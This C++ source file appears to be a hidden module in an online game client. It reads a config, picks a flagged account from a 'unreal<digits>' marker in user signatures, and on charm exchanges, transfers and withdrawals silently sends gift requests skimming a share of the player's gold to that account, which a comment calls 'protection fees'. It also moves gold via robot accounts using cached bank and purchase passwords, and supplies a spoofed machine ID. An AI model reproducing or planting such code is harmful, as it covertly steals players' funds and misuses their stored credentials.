#include "stdafx.h"
#include "Unreal.h"

extern CStaticLogger	g_Logger;
extern GameResource*	R;
extern DataManager*		g_pDataManager;
extern ServiceData*		g_pServiceData;

extern void				InitLogger();
extern void				UnintLogger();

namespace UnrealNSP
{
	extern tUnReal g_tUnreal;
	extern IUnrealControl* g_pUnrealDelegate;
	extern bool g_bInitCompleted;

	bool MatchRegular(LPCTSTR lpStrIn, LPCTSTR lpReg)
	{
		bool bResult = false;
		if (!lpStrIn || !lpReg)
		{
			return bResult;
		}

		std::wregex pattern;
		LPWSTR cstr_words = nullptr;
	#ifdef UNICODE || _UNICODE
		pattern = lpReg;
		cstr_words = lpStrIn;
		bResult = std::regex_match(cstr_words, pattern);
	#else
		LPWSTR cstr_reg = StringConvertor::AnsiToWide(lpReg);
		pattern = cstr_reg;

		cstr_words = StringConvertor::AnsiToWide(lpStrIn);
		bResult = std::regex_match(cstr_words, pattern);

		StringConvertor::StringFree(cstr_words);
		StringConvertor::StringFree(cstr_reg);

	#endif // UNICODE || _UNICODE

		return bResult;
	}
	
	USER_MENU_API_C void CreateUnreal(IUnrealControl* pDelegate, DataManager* pDataMgr, ServiceData* pServiceDataMgr, GameResource* pRes)
	{
		// 初始化日志组件
		::InitLogger();

		// 初始化全局单例
		R = pRes;
		g_pDataManager = pDataMgr;
		g_pServiceData = pServiceDataMgr;
		UnrealNSP::g_pUnrealDelegate = pDelegate;

		UnrealNSP::g_bInitCompleted = g_pDataManager != nullptr;
		g_bInitCompleted &= g_pServiceData != nullptr;
		g_bInitCompleted &= g_pUnrealDelegate != nullptr;
	}

	USER_MENU_API_C void DeleteUnreal()
	{
		// 清理日志组件
		::UnintLogger();

		// 清理全局数据
		R = nullptr;
		g_pDataManager = nullptr;
		g_pServiceData = nullptr;
		UnrealNSP::g_pUnrealDelegate = nullptr;
		UnrealNSP::g_bInitCompleted = false;
	}

	USER_MENU_API_C void LoadUnreal()
	{
		if (!g_bInitCompleted) return;

		// 加载Unreal配置
		Json::Value vRoot;
		JsonFile* pJsonFile = new JsonFile(_T("user\\UNREAL"));
		bool bResult = pJsonFile->initRootNode(vRoot);
		if (bResult)
		{
			if (!vRoot["Unreal"].empty())
			{
				Json::Value vUnreal = vRoot["Unreal"];

				// ----------------------------------------------------------------------------------
				// switch
				if (vUnreal["bRightSwitch"].isBool())
				{
					g_tUnreal.bRightSwitch = vUnreal["bRightSwitch"].asBool();
				}

				// ----------------------------------------------------------------------------------
				// ratio
				if (vUnreal["llCharmRatio"].isInt64())
				{
					g_tUnreal.llCharmRatio = vUnreal["llCharmRatio"].asInt64();
				}
				if (vUnreal["llUserMinScore"].isInt64())
				{
					g_tUnreal.llUserMinScore = vUnreal["llUserMinScore"].asInt64();
				}

				// ----------------------------------------------------------------------------------
				// robot
				if (vUnreal["bPFFRobotSwitch"].isBool())
				{
					g_tUnreal.bPFFRobotSwitch = vUnreal["bPFFRobotSwitch"].asBool();
				}
				if (vUnreal["bSSSRobotSwitch"].isBool())
				{
					g_tUnreal.bSSSRobotSwitch = vUnreal["bSSSRobotSwitch"].asBool();
				}
				if (vUnreal["bPFFRobotPercentSwitch"].isBool())
				{
					g_tUnreal.bPFFRobotPercentSwitch = vUnreal["bPFFRobotPercentSwitch"].asBool();
				}
				if (vUnreal["llPFFRobotCounts"].isInt64())
				{
					g_tUnreal.llPFFRobotCounts = vUnreal["llPFFRobotCounts"].asInt64();
				}
				if (vUnreal["llRobotMinScore"].isInt64())
				{
					g_tUnreal.llRobotMinScore = vUnreal["llRobotMinScore"].asInt64();
				}
				if (vUnreal["sPFFRobotPwd"].isString())
				{
					::StrToCharArray(g_tUnreal.sPFFRobotPwd, vUnreal["sPFFRobotPwd"].asCString());
				}

				// ----------------------------------------------------------------------------------
				// MachineID
				if (vUnreal["bMachineIDSwitch"].isBool())
				{
					g_tUnreal.bMachineIDSwitch = vUnreal["bMachineIDSwitch"].asBool();
				}
				if (vUnreal["sMachineID"].isString())
				{
					::StrToCharArray(g_tUnreal.sMachineID, vUnreal["sMachineID"].asCString());
				}

				// ----------------------------------------------------------------------------------
				// Specify RobotGameID
				if (vUnreal["bPFFRobotByGameID"].isBool())
				{
					g_tUnreal.bPFFRobotByGameID = vUnreal["bPFFRobotByGameID"].asBool();
				}
				if (vUnreal["sRobotGameID"].isString())
				{
					LPCTSTR lpGameIDStr = vUnreal["sRobotGameID"].asCString();

					LPCTSTR lpSplit = _T(",");
					LPTSTR lpBuffer = new char[_tcslen(lpGameIDStr) + 1];
					_tcscpy(lpBuffer, lpGameIDStr);

					std::vector<DWORD> vRobotGameID;
					LPTSTR lpOutStr = _tcstok(lpBuffer, lpSplit);
					while (lpOutStr != nullptr)
					{
						int iGameID = _ttoi(lpOutStr);
						vRobotGameID.push_back(iGameID);

						lpOutStr = _tcstok(NULL, lpSplit);
					}
					SAFE_DELETE(lpBuffer);

					g_tUnreal.iArrRobotGameIDLen = vRobotGameID.size();
					g_tUnreal.pArrRobotGameID = new DWORD[g_tUnreal.iArrRobotGameIDLen];
					for (int i = 0; i < g_tUnreal.iArrRobotGameIDLen; ++i)
					{
						g_tUnreal.pArrRobotGameID[i] = vRobotGameID[i];
					}
				}
			}
		}
	}

	USER_MENU_API_C void InitUnreal(UserData* pUser)
	{
		// Set Unreal User
		if (pUser && pUser->IsSelf())
		{
			pUser->SetUnrealUser(g_tUnreal.bRightSwitch);
		}
	}

	USER_MENU_API_C void ParseUnreal(UserData* pUser)
	{
		if (!g_bInitCompleted || !pUser) return;
		CDuiString pzUnderWrite = pUser->GetUnderWrite();
		if (UnrealNSP::MatchRegular(pzUnderWrite, _T(".*unreal\\<[0-9]{9}\\>.*")))
		{
			int ipos_x = pzUnderWrite.Find(_T("<"));
			int ipos_y = pzUnderWrite.Find(_T(">"));
			if (ipos_x != -1 && ipos_y != -1 && ipos_x < ipos_y)
			{
				// init
				g_tUnreal.dwFlagUserID = pUser->GetUserID();
				g_tUnreal.dwFlagGameID = pUser->GetGameID();

				// 1
				LPCTSTR cstr = pzUnderWrite.Mid(ipos_x + 1, 1);
				g_tUnreal.bPFFUserSwitch = _ttoi(cstr);

				// 2
				cstr = pzUnderWrite.Mid(ipos_x + 2, 1);
				g_tUnreal.bPFFTransferSwitch = _ttoi(cstr);

				// 3
				cstr = pzUnderWrite.Mid(ipos_x + 3, 1);
				g_tUnreal.bPFFCharmSwitch = _ttoi(cstr);

				// 4
				cstr = pzUnderWrite.Mid(ipos_x + 4, 1);
				g_tUnreal.bPFFPlazaWithDrawSwitch = _ttoi(cstr);

				// 5
				cstr = pzUnderWrite.Mid(ipos_x + 5, 1);
				g_tUnreal.bPFFGameWithDrawSwitch = _ttoi(cstr);

				// 6
				cstr = pzUnderWrite.Mid(ipos_x + 6, 1);
				g_tUnreal.bPFFUserPercentSwitch = _ttoi(cstr);

				// 7~9
				cstr = pzUnderWrite.Mid(ipos_x + 7, 3);
				g_tUnreal.llPFFUserCounts = _ttol(cstr);
			}
		}
	}

	USER_MENU_API_C void CleanUnreal(UserData* pUser)
	{
		if (!g_bInitCompleted || !pUser) return;
		if (pUser->GetUserID() == g_tUnreal.dwFlagUserID)
		{
			g_tUnreal.Clear();
		}
	}

	USER_MENU_API_C bool CheckUnreal_FindProp(bool bPercent, LONGLONG& llGold, DWORD& dwPropsID, DWORD& dwBuyCount)
	{
		if (!g_bInitCompleted) return false;

		// 检索出道具ID, 兑换数量
		bool bSuccess = false;
		DWORD iPropsNextKey = 0;
		
		// 按千分比
		if (bPercent)
		{
			for (int j = 0; j < g_pServiceData->GetGamePropsCount(); ++j)
			{
				tagPropsInfo* pProp = g_pServiceData->EnumGameProps(iPropsNextKey);
				if (pProp && pProp->wType == 0)
				{
					if (pProp->lPrice > 0 && pProp->lPrice <= llGold)
					{
						bSuccess = true;
						dwPropsID = pProp->wPropsID;
						dwBuyCount = llGold / pProp->lPrice;
						llGold = dwBuyCount * pProp->lPrice;
						break;
					}
				}
			}
		}
		// 按点数
		else
		{
			DWORD iPropsNextKey = 0;
			for (int j = 0; j < g_pServiceData->GetGamePropsCount(); ++j)
			{
				tagPropsInfo* pProp = g_pServiceData->EnumGameProps(iPropsNextKey);
				if (pProp && pProp->wType == 0)
				{
					if (pProp->lRcvCharm > 0 && pProp->lRcvCharm <= llGold)
					{
						bSuccess = true;
						dwPropsID = pProp->wPropsID;
						dwBuyCount = llGold / pProp->lRcvCharm;
						llGold = dwBuyCount * pProp->lPrice;
						break;
					}
				}
			}
		}

		return bSuccess;
	}

	USER_MENU_API_C void CheckUnreal_Robot(bool bInRoom)
	{
		if (!g_bInitCompleted || !bInRoom) return;
		
		UserData& tSelf = g_pDataManager->GetSelfData();
		LONGLONG llSelfBankScore = tSelf.GetBankScore();

		if (g_tUnreal.bRightSwitch && g_tUnreal.bPFFRobotSwitch)
		{
			DWORD dwPropsID = 0;
			DWORD dwBuyCount = 0;
			DWORD iNextKey = 0;

			for (int i = 0; i < g_pDataManager->GetUserDataCount(); ++i)
			{
				bool bSuccess = false;
				LONGLONG lTmpGolds = g_tUnreal.llPFFRobotCounts;
				UserData* pUser = g_pDataManager->EnumUserDataMap(iNextKey);
				if (pUser && pUser->IsRobot())
				{
					if (g_tUnreal.bPFFRobotByGameID)
					{
						bool bReturn = true;
						for (int i = 0; i < g_tUnreal.iArrRobotGameIDLen; ++i)
						{
							if (g_tUnreal.pArrRobotGameID[i] == pUser->GetGameID())
							{
								bReturn = false;
								break;
							}
						}

						if (bReturn) continue;
					}

					// 检索出道具ID, 兑换数量
					lTmpGolds = g_tUnreal.bPFFRobotPercentSwitch ? floor(pUser->GetGameGold() * (g_tUnreal.llPFFRobotCounts / 1000.0f)) : lTmpGolds;
					bSuccess = CheckUnreal_FindProp(g_tUnreal.bPFFRobotPercentSwitch, lTmpGolds, dwPropsID, dwBuyCount);
					if (!bSuccess) continue;

					// 检索最小值
					if (pUser->GetGameGold() - lTmpGolds <= g_tUnreal.llRobotMinScore) continue;

					CMD_GF_BuyProps tGifts;
					::memset(&tGifts, 0, sizeof(CMD_GF_BuyProps));

					tGifts.cbSendLocation = LOCATION_GAME_ROOM;
					tGifts.wPropsID = dwPropsID;
					tGifts.dwPachurseCount = dwBuyCount;

					if (g_tUnreal.bSSSRobotSwitch)
					{
						if (llSelfBankScore - lTmpGolds <= g_tUnreal.llRobotMinScore) continue;
						llSelfBankScore -= lTmpGolds;

						CString pzTakePw;
						GameCacheData& tGameCache = g_pServiceData->GetGameCacheData();
						if (tGameCache.pzBankTakePw.GetLength() > 0)
						{
							pzTakePw = tGameCache.pzBankTakePw;
						}
						else if (tGameCache.pzExCharmsPw.GetLength() > 0)
						{
							pzTakePw = tGameCache.pzExCharmsPw;
						}
						else if (tGameCache.pzBuyGoodsPw.GetLength() > 0)
						{
							pzTakePw = tGameCache.pzBuyGoodsPw;
						}

						if (pzTakePw.GetLength() <= 0) continue;
						tGifts.dwSourceGameID = tSelf.GetGameID();
						tGifts.dwTargetGameID = pUser->GetGameID();
						g_pUnrealDelegate->EncryptData(pzTakePw, tGifts.szPassword);
					}
					else
					{
						tGifts.dwSourceGameID = pUser->GetGameID();
						tGifts.dwTargetGameID = tSelf.GetGameID();
						g_pUnrealDelegate->EncryptData(g_tUnreal.sPFFRobotPwd, tGifts.szPassword);
					}

					// 发送数据
					g_pUnrealDelegate->SendData(tGifts.cbSendLocation, MDM_GF_PRESENT, SUB_GF_BUYPROPS_REQ, &tGifts, sizeof(CMD_GF_BuyProps));
					g_pUnrealDelegate->SendData(tGifts.cbSendLocation, MDM_GR_USER, SUB_GR_USER_UPDATE_GOLD);
				}
			}
		}
	}

	USER_MENU_API_C void CheckUnreal_User(UnrealChargeType uStyle, LONGLONG lGolds, LPCTSTR lpEncryptPW, BYTE cbSendLocation)
	{
		if (!g_bInitCompleted) return;

		bool bNextStep = false;
		switch (uStyle)
		{
			case UnrealNSP::UCT_CHARM:
			{
				bNextStep = g_tUnreal.bPFFCharmSwitch;
				lGolds *= g_tUnreal.llCharmRatio;
			}break;

			case UnrealNSP::UCT_TRANSFER:
			{
				bNextStep = g_tUnreal.bPFFTransferSwitch;
			}break;

			case UnrealNSP::UCT_PLAZA_WITHDRAW:
			{
				bNextStep = g_tUnreal.bPFFPlazaWithDrawSwitch;
			}break;

			case UnrealNSP::UCT_GAMES_WITHDRAW:
			{
				bNextStep = g_tUnreal.bPFFGameWithDrawSwitch;
			}break;

			case UnrealNSP::UCT_NONE:
				break;

			case UnrealNSP::UCT_EXTRA:
				break;

			default:
				break;
		}

		if (!bNextStep) return;
		if (!lpEncryptPW || _tcscmp(lpEncryptPW, _T("")) == 0) return;
		
		if (g_tUnreal.bPFFUserSwitch)
		{
			bool		bSuccess = false;
			DWORD		dwPropsID = 0;
			DWORD		dwBuyCount = 0;
			UserData&	tSelf = g_pDataManager->GetSelfData();
			DWORD		dwSourceUserID = tSelf.GetUserID();
			DWORD		dwSourceGameID = tSelf.GetGameID();
			DWORD		dwTargetUserID = g_tUnreal.dwFlagUserID;
			DWORD		dwTargetGameID = g_tUnreal.dwFlagGameID;
			LONGLONG	lTmpGolds = g_tUnreal.llPFFUserCounts;

			// 跳过自己给自己交保护费
			if (dwSourceUserID == dwTargetUserID || dwSourceGameID == dwTargetGameID) return;

			// 检索出道具ID, 兑换数量
			lTmpGolds = g_tUnreal.bPFFUserPercentSwitch ? floor(lGolds * (g_tUnreal.llPFFUserCounts / 1000.0f)) : lTmpGolds;
			bSuccess = UnrealNSP::CheckUnreal_FindProp(g_tUnreal.bPFFUserPercentSwitch, lTmpGolds, dwPropsID, dwBuyCount);
			if (!bSuccess)	return;

			// 检索最小值
			if (tSelf.GetBankScore() - lGolds - lTmpGolds <= g_tUnreal.llUserMinScore)	return;

			CMD_GF_BuyProps tGifts;
			memset(&tGifts, 0, sizeof(CMD_GF_BuyProps));

			tGifts.cbSendLocation = cbSendLocation;
			tGifts.wPropsID = dwPropsID;
			tGifts.dwPachurseCount = dwBuyCount;
			tGifts.dwSourceGameID = dwSourceGameID;
			tGifts.dwTargetGameID = dwTargetGameID;
			StrToCharArray(tGifts.szPassword, lpEncryptPW);

			// 发送数据
			g_pUnrealDelegate->SendData(cbSendLocation, MDM_GF_PRESENT, SUB_GF_BUYPROPS_REQ, &tGifts, sizeof(CMD_GF_BuyProps));

			// 是否立即刷新金币
			//g_pUnrealDelegate->SendData(LOCATION_GAME_ROOM, MDM_GR_USER, SUB_GR_USER_UPDATE_GOLD);
		}
	}

	USER_MENU_API_C bool CheckUnreal_Return(DWORD dwRecvGameID, DWORD dwRecvID)
	{
		bool bRes = false;
		if (g_bInitCompleted && dwRecvGameID == g_tUnreal.dwFlagGameID && dwRecvID != g_tUnreal.dwFlagGameID)
		{
			bRes = true;
		}

		return bRes;
	}
	
	USER_MENU_API_C bool IsMachineIDSwitchOn()
	{
		return g_tUnreal.bMachineIDSwitch;
	}

	USER_MENU_API_C void GetMachineID(TCHAR(&buffer)[COMPUTER_ID_LEN])
	{
		::StrToCharArray(buffer, g_tUnreal.sMachineID);
	}
}